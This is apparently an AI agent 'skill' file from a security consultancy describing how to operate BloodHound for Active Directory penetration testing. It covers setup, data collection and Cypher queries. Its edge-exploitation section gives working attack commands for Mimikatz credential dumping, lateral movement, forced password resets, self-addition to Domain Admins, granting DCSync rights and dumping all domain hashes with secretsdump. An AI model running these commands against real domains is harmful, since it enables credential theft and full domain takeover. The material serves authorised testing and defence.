---
name: bloodhound
description: >
  Operate BloodHound and BloodHound Community Edition (CE) for Active Directory
  attack path analysis. Use when performing AD penetration testing, enumerating
  domain trusts, identifying Kerberoastable users, finding paths to Domain Admin,
  or analyzing ACL-based attack paths. Covers CE vs Legacy architecture, Docker
  installation, SharpHound and BloodHound.py collection, data ingestion, built-in
  queries, custom Cypher queries, edge semantics (MemberOf, HasSession, AdminTo,
  GenericAll, WriteDACL, DCSync), and attack path execution workflows.
metadata:
  author: redhoundinfosec
  version: '1.0'
  reference: https://github.com/SpecterOps/BloodHound
---

# bloodhound Agent Skill

## When to Use This Skill

Use this skill when:
- Performing Active Directory penetration testing or red team engagements
- The user needs to find attack paths from a low-privilege user to Domain Admin
- Enumerating Kerberoastable accounts, AS-REP roastable users, or DCSync rights
- Analyzing ACL-based privilege escalation (GenericAll, WriteDACL, etc.)
- The user needs to run BloodHound CE via Docker or query the Neo4j/PostgreSQL backend
- The user wants to write custom Cypher queries for specific attack path analysis
- Identifying misconfigured delegation, trust relationships, or AdminTo edges

## What BloodHound Does

BloodHound maps Active Directory environments as a graph database, exposing
attack paths that would be invisible through traditional enumeration. Collectors
(SharpHound, BloodHound.py) gather relationships between users, groups, computers,
GPOs, OUs, and domains, storing them as nodes and edges. Attackers then query the
graph to find the shortest path from their current access level to Domain Admin or
other high-value targets.

## BloodHound CE vs Legacy

| Feature              | Legacy (3.x/4.x)      | Community Edition (CE) |
|---------------------|-----------------------|------------------------|
| Backend DB          | Neo4j                 | PostgreSQL + custom API |
| Auth                | None (local)          | JWT-based login |
| Deployment          | Standalone binary     | Docker Compose |
| API                 | None                  | Full REST API |
| Custom queries UI   | Limited               | Enhanced |
| Active development  | Deprecated            | Active (SpecterOps) |

## Installation — BloodHound CE (Docker Compose)

```bash
# Prerequisites: Docker, Docker Compose v2
curl -L https://github.com/SpecterOps/BloodHound/raw/main/examples/docker-compose/docker-compose.yml \
  -o bloodhound-ce.yml

# Start BloodHound CE (pulls ~1GB of images)
docker compose -f bloodhound-ce.yml up -d

# Default ports:
# 8080 — BloodHound CE web UI
# 7474 — Neo4j browser (legacy) / not used in CE
# 5432 — PostgreSQL

# First login: admin / [auto-generated password in logs]
docker compose -f bloodhound-ce.yml logs | grep "Initial Password"

# Access UI
open http://localhost:8080
```

## Installation — Legacy BloodHound (4.x)

```bash
# Requires: Neo4j 4.x, Java 11+
# Download BloodHound binary from releases
wget https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip

# Start Neo4j
neo4j console   # or: neo4j start

# Launch BloodHound
./BloodHound --no-sandbox
# Connect to: bolt://localhost:7687
# Default creds: neo4j / [set on first run]
```

## Data Collection — SharpHound (Windows)

```powershell
# Download from GitHub releases or embed in payload
# https://github.com/BloodHoundAD/SharpHound/releases

# Full collection (recommended)
SharpHound.exe -c All

# Specific collections
SharpHound.exe -c DCOnly          # DC-only — stealthier
SharpHound.exe -c Session         # User sessions only
SharpHound.exe -c ACL             # ACL enumeration only
SharpHound.exe -c Trusts          # Domain trusts
SharpHound.exe -c LoggedOn        # Requires local admin on targets

# Target specific DC
SharpHound.exe -c All --DomainController dc01.corp.local

# Output to specific directory
SharpHound.exe -c All --OutputDirectory C:\Users\Public\

# Use alternate credentials
SharpHound.exe -c All --LdapUsername svc_enum --LdapPassword 'P@ssword1'

# Stealth options
SharpHound.exe -c All --Stealth       # Skips stealth-hostile checks
SharpHound.exe -c All --ExcludeDCs    # Don't directly enum DCs

# Loop collection (capture session changes)
SharpHound.exe -c Session --Loop --LoopDuration 02:00:00 --LoopInterval 00:05:00
```

Output: a ZIP file (e.g., `20240401120000_BloodHound.zip`) containing JSON files
for computers, users, groups, domains, GPOs, OUs, and sessions.

## Data Collection — BloodHound.py (Linux / No Agent)

```bash
pip install bloodhound

# Domain-joined context or with creds
bloodhound-python -u 'username' -p 'password' -d corp.local \
  -ns 192.168.1.10 -c All

# With NTLM hash (pass-the-hash)
bloodhound-python -u 'username' --hashes ':NTLMhash' -d corp.local \
  -ns 192.168.1.10 -c All

# Kerberos authentication
bloodhound-python -u 'username' -p 'password' -d corp.local \
  -ns 192.168.1.10 -c All -k

# Collect only specific items
bloodhound-python -u 'username' -p 'password' -d corp.local \
  -ns 192.168.1.10 -c DCOnly,Session,ACL

# Output directory
bloodhound-python -u 'username' -p 'password' -d corp.local \
  -ns 192.168.1.10 -c All --zip -o /tmp/bh_output/
```

## Uploading Data to BloodHound

**CE (Web UI):**
1. Navigate to `http://localhost:8080`
2. Go to Administration → File Ingest
3. Upload ZIP or individual JSON files

**CE (API):**
```bash
# Authenticate
TOKEN=$(curl -s -X POST http://localhost:8080/api/v2/login \
  -H 'Content-Type: application/json' \
  -d '{"login_method":"secret","secret":"password","username":"admin"}' \
  | jq -r '.data.session_token')

# Upload ZIP
curl -s -X POST http://localhost:8080/api/v2/file-upload/start \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json'

# (Get upload task ID from response, then upload file)
curl -s -X POST "http://localhost:8080/api/v2/file-upload/{task_id}" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@BloodHound.zip"
```

**Legacy:**
- Drag and drop ZIP into BloodHound GUI

## Built-in Queries

Access via BloodHound UI → Analysis tab:

| Query | Purpose |
|-------|---------|
| Shortest Paths to Domain Admin | Core attack path query |
| Find all Domain Admins | List DA group members |
| Find Shortest Paths to High Value Targets | Paths to Tier 0 assets |
| Find all Kerberoastable Users | SPN-bearing accounts |
| Find Kerberoastable Users with most privileges | High-value Kerberoast targets |
| Find AS-REP Roastable Users | DontReqPreauth accounts |
| Find Workstations where Domain Users can RDP | Lateral movement opportunities |
| Find all users with DCSync rights | GetChanges/GetChangesAll ACLs |
| Shortest Paths from Owned Principals | Post-compromise path finding |
| Find Computers with Unconstrained Delegation | High-risk delegation |
| Find Computers with Constrained Delegation | Constrained delegation abuse |

## Custom Cypher Queries

BloodHound uses Cypher (Neo4j query language) for custom analysis.

```cypher
// All users with a path to Domain Admin
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
WHERE NOT u.name STARTS WITH 'KRBTGT'
RETURN p

// All computers where a specific user has admin rights
MATCH (u:User {name:"JDOE@CORP.LOCAL"})-[:AdminTo]->(c:Computer)
RETURN c.name

// Users with GenericAll over a group
MATCH p=(u:User)-[:GenericAll]->(g:Group)
RETURN u.name, g.name

// Kerberoastable users with admin rights (highest priority targets)
MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group)-[:AdminTo]->(c:Computer)
RETURN u.name, c.name

// Find all AS-REP roastable users
MATCH (u:User {dontreqpreauth:true})
RETURN u.name, u.enabled ORDER BY u.name

// DCSync rights (GetChangesAll)
MATCH p=(u:User)-[:DCSync]->(d:Domain)
RETURN u.name, d.name

// Transitive group membership to DA
MATCH p=(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN u.name, length(p)

// All edges from owned nodes
MATCH (n {owned:true})-[r]->(m)
RETURN type(r), m.name, labels(m)

// Computers with sessions for high-value users
MATCH (u:User)-[:HasSession]->(c:Computer)
WHERE u.admincount=true
RETURN u.name, c.name

// Find all paths ≤ 4 hops to DA from non-admin users
MATCH p=shortestPath((u:User)-[*1..4]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
WHERE NOT u.admincount
RETURN p LIMIT 25
```

## Edge Semantics and Exploitation

### MemberOf
User/group is a member of a target group. Transitive membership grants all group rights.

### HasSession
A user has an authenticated session on a computer. If you compromise that computer
(local admin), you can dump credentials with Mimikatz to obtain the user's NTLM hash.

```powershell
# Once local admin on target computer:
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### AdminTo
Principal has local administrator rights on the computer (via group policy, direct
ACL, or group membership). Enables lateral movement.

```bash
# Lateral movement options once AdminTo confirmed:
# PsExec, WMIExec, SMBExec, CrackMapExec
crackmapexec smb TARGET -u user -p pass -x 'whoami'
impacket-psexec corp.local/user:pass@TARGET
```

### GenericAll
Full control over the target object. For users: force password reset.
For groups: add members. For computers: targeted kerberoast or RBCD attack.

```powershell
# Force password reset (GenericAll over user)
Set-ADAccountPassword -Identity targetuser -NewPassword (ConvertTo-SecureString "NewPass1!" -AsPlainText -Force) -Reset

# Add self to group (GenericAll over group)
Add-ADGroupMember -Identity "Domain Admins" -Members compromiseduser

# RBCD attack (GenericAll over computer)
# Set msDS-AllowedToActOnBehalfOfOtherIdentity attribute
```

### WriteDACL
Can modify the DACL (permissions) on the target. Use to grant yourself
GenericAll or DCSync rights.

```powershell
# Grant DCSync rights (WriteDACL on domain object)
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity compromiseduser \
  -Rights DCSync -Verbose
```

### DCSync
Grants replication rights on the domain object (`GetChanges` + `GetChangesAll`).
Use impacket-secretsdump to extract all hashes.

```bash
impacket-secretsdump -just-dc corp.local/compromiseduser:pass@DC_IP
impacket-secretsdump -just-dc-ntlm corp.local/compromiseduser:pass@DC_IP
```

### ForceChangePassword
Can change target user's password without knowing the current one.

```powershell
$SecPass = ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force
Set-ADAccountPassword -Identity targetuser -NewPassword $SecPass -Reset
```

### AllowedToDelegate / AllowedToAct
Constrained/unconstrained delegation edges. See Kerberos delegation attacks.

## Attack Path Execution Workflow

1. **Collect**: Run SharpHound (`-c All`) or BloodHound.py
2. **Ingest**: Upload ZIP to BloodHound CE or legacy GUI
3. **Mark owned nodes**: Right-click → Mark as Owned for your current accounts/computers
4. **Run**: Analysis → Shortest Paths from Owned Principals
5. **Identify pivot**: Find shortest path — note each edge type
6. **Exploit edges in sequence**: Follow the edge exploitation guide above
7. **Re-collect**: After gaining new access, re-run SharpHound to update sessions

## Advanced Techniques

### Bloodhound CE REST API for Automation
```bash
# Get all nodes of type User
curl -s http://localhost:8080/api/v2/graph-search?query=MATCH+(n:User)+RETURN+n \
  -H "Authorization: Bearer $TOKEN"

# Export all paths to DA
curl -s http://localhost:8080/api/v2/analysis \
  -H "Authorization: Bearer $TOKEN" | jq .
```

### Marking Nodes as Owned / High Value
```cypher
// Mark all compromised users as owned
MATCH (u:User) WHERE u.name IN ["JDOE@CORP.LOCAL","SVC_SQL@CORP.LOCAL"]
SET u.owned = true

// Mark additional high-value targets
MATCH (c:Computer {name:"FINANCE01.CORP.LOCAL"})
SET c.highvalue = true
```

### Cross-Domain / Forest Trust Analysis
```cypher
// Find inter-domain trust edges
MATCH p=(d1:Domain)-[r:TrustedBy|HasTrust*1..]->(d2:Domain)
RETURN p

// Users from external domain with rights in this domain
MATCH (u:User)-[r]->(n) WHERE u.domain <> n.domain
RETURN u.name, type(r), n.name
```

## Troubleshooting

**SharpHound LDAP errors**: Ensure the collecting account has domain read rights.
Use `--LdapUsername` / `--LdapPassword` if not running as domain user.

**BloodHound.py DNS failures**: Pass `-ns [DC_IP]` explicitly; DNS must resolve
domain names. Add DC IP to `/etc/resolv.conf` or `/etc/hosts` if needed.

**CE container won't start**: Verify Docker socket permissions and port conflicts
on 8080. Check logs: `docker compose -f bloodhound-ce.yml logs bloodhound`.

**Cypher query timeout**: Add `LIMIT` clauses. For large environments, query
specific starting nodes rather than all nodes.

**No sessions in graph**: Sessions require local admin access to enumerate.
BloodHound.py with `-c Session` requires `-u/-p` of an admin-level account.
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [5 Active Directory Misconfigurations We See in Every Engagement](https://redhound.us/ad-misconfigurations)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
